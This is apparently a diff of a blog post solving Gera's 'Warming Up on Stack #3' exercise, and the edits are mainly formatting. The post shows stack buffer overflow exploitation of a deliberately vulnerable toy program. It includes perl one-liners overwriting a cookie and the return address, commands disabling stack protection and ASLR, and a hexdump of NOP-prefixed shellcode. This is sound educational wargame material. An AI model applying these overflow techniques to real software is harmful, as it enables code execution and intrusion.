@@ -32,23 +32,23 @@ The above program accepts user-input through the `gets` function and then looks 
 
 Here are a few observations that could be made by looking at the source of the program:
 
-1. Since it is defined prior to `buf`, the `cookie` would be placed at a higher memory address on the program stack, just below the saved registers from the function prologue
-2. The `buf` character array would be at an offset of at least 80B from `cookie`
-3. The `gets` call would accept unbounded user-input within `buf` array and hence it provides a mechanism to alter the call stack contents
+- Since it is defined prior to `buf`, the `cookie` would be placed at a higher memory address on the program stack, just below the saved registers from the function prologue
+- The `buf` character array would be at an offset of at least 80B from `cookie`
+- The `gets` call would accept unbounded user-input within `buf` array and hence it provides a mechanism to alter the call stack contents
 
 Stack layout for [stack3.c](http://community.corest.com/%7Egera/InsecureProgramming/stack3.html) is identical to [stack1.c](http://community.corest.com/%7Egera/InsecureProgramming/stack1.html) as already outlined in the [Gera's Warming Up on Stack #1 - Solutions](https://7h3ram.github.io/posts/20120827_geras-wuos-stack1-solutions.html) post.
 
 Here are solutions I could think of to get the `you win!` message
 printed:
 
-- Solution #1: Overflow the internal `buf` array to overwrite `cookie` with `0x01020005`
-- Solution #2: Overflow the internal `buf` array to overwrite EIP with the address of `printf(you win!)`
-- Solution #3: Inject a NOP-prefixed `printf(you win!)` shellcode and overwrite EIP with its address
-- Solution #4: Inject a NOP-prefixed `printf(you win!)` shellcode through an environment var and overwrite EIP with its address
+- [Solution #1: Overflow the internal `buf` array to overwrite `cookie` with `0x01020005`](#solution1)
+- [Solution #2: Overflow the internal `buf` array to overwrite EIP with the address of `printf(you win!)`](#solution2)
+- [Solution #3: Inject a NOP-prefixed `printf(you win!)` shellcode and overwrite EIP with its address](#solution3)
+- [Solution #4: Inject a NOP-prefixed `printf(you win!)` shellcode through an environment var and overwrite EIP with its address](#solution4)
 
 Here's a brief description of the test system:
 
-```
+```c
 # cat /etc/lsb-release | grep DESC ; uname -a | cut -d' ' -f1,3,12-13 ; gcc --version | grep gcc ; cat /proc/cpuinfo | grep -E '(vendor|model|flags)'
 DISTRIB_DESCRIPTION=*Ubuntu 10.04.2 LTS*
 Linux 2.6.38 i686 GNU/Linux
@@ -60,11 +60,12 @@ flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat 
 ```
 
 ## Solutions
+<a name="solution1"></a>
 ### Solution #1: Overflow the internal `buf` array to overwrite cookie with `0x01020005`
 
 Here's the GCC commandline to prepare [stack3.c](http://community.corest.com/%7Egera/InsecureProgramming/stack3.html) for this solution:
 
-```
+```c
 # gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack3 stack3.c
 stack3.c: In function ‘main’:
 stack3.c:8: warning: incompatible implicit declaration of built-in function ‘printf’
@@ -76,17 +77,18 @@ stack3.c:(.text+0x27): warning: the `gets' function is dangerous and should not 
 
 All done, let's exploit [stack3.c](http://community.corest.com/%7Egera/InsecureProgramming/stack3.html):
 
-```
+```c
 # perl -e 'print "A"x80 . "\x05\x00\x02\x01"' | ./stack3
 buf: bfd625a4 cookie: bfd625f4
 you win!
 ```
 
+<a name="solution2"></a>
 ### Solution #2: Overflow the internal `buf` array to overwrite EIP with the address of `printf(you win!)`
 
 We need to have a look at the assembly of [stack3.c](http://community.corest.com/%7Egera/InsecureProgramming/stack3.html) and find out the location of the `printf` function which displays the `you win!` message:
 
-```
+```c
 # objdump -d -M intel stack3 | grep -A20 main.:
 08048444 <main>:
  8048444:   55                      push   ebp
@@ -113,18 +115,19 @@ We need to have a look at the assembly of [stack3.c](http://community.corest.com
 
 The address turns out to be 0x8048479. Let's try exploiting:
 
-```
+```c
 # perl -e 'print "A"x88 . "\x79\x84\x04\x08"' | ./stack3
 buf: bfb82e64 cookie: bfb82eb4
 you win!
 Segmentation fault
 ```
 
+<a name="solution3"></a>
 ### Solution #3: Inject a NOP-prefixed `printf(you win!)` shellcode and overwrite EIP with its address
 
 Let's first recompile [stack3.c](http://community.corest.com/%7Egera/InsecureProgramming/stack3.html) and request GCC to mark program stack as executable. Additionally, we also need to turn ASLR off so that we can have a static return address to overwrite EIP with:
 
-```
+```c
 # gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o stack3 stack3.c 2>/dev/null ; readelf -l stack3 | grep GNU_STACK
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
 #
@@ -132,9 +135,9 @@ Let's first recompile [stack3.c](http://community.corest.com/%7Egera/InsecurePro
 0
 ```
 
-Now lets go ahead with exploitation. The Null-free, NOP-prefixed `printf(you win!)` shellcode we used to exploit [stack1.c](http://community.corest.com/%7Egera/InsecureProgramming/stack1.html) in the [Gera's Warming Up on Stack #1 - Solutions](https://7h3ram.github.io/posts/20120827_geras-wuos-stack1-solutions.html) post could be reused here:
+Now lets go ahead with exploitation. The Null-free, NOP-prefixed `printf(you win!)` shellcode we used to exploit [stack1.c](http://community.corest.com/%7Egera/InsecureProgramming/stack1.html) in the [Gera's Warming Up on Stack #1 - Solutions](/posts/20120827_geras-wuos-stack1-solutions.html) post could be reused here:
 
-```
+```c
 # ./stack3
 buf: bffff4c4 cookie: bffff514
 #
@@ -146,11 +149,12 @@ buf: bffff4c4 cookie: bffff514
 you win!#
 ```
 
+<a name="solution4"></a>
 ### Solution #4: Inject a NOP-prefixed `printf(you win!)` shellcode through an environment var overwrite EIP with its address
 
 Lets get straight to exploitation:
 
-```
+```c
 # echo $WINCODE | hexdump -C
 00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 20 cd  |..1.1.1.....Y. .|
 00000010  80 31 c0 40 31 db cd 80  e8 e5 ff ff ff 79 6f 75  |.1.@1........you|
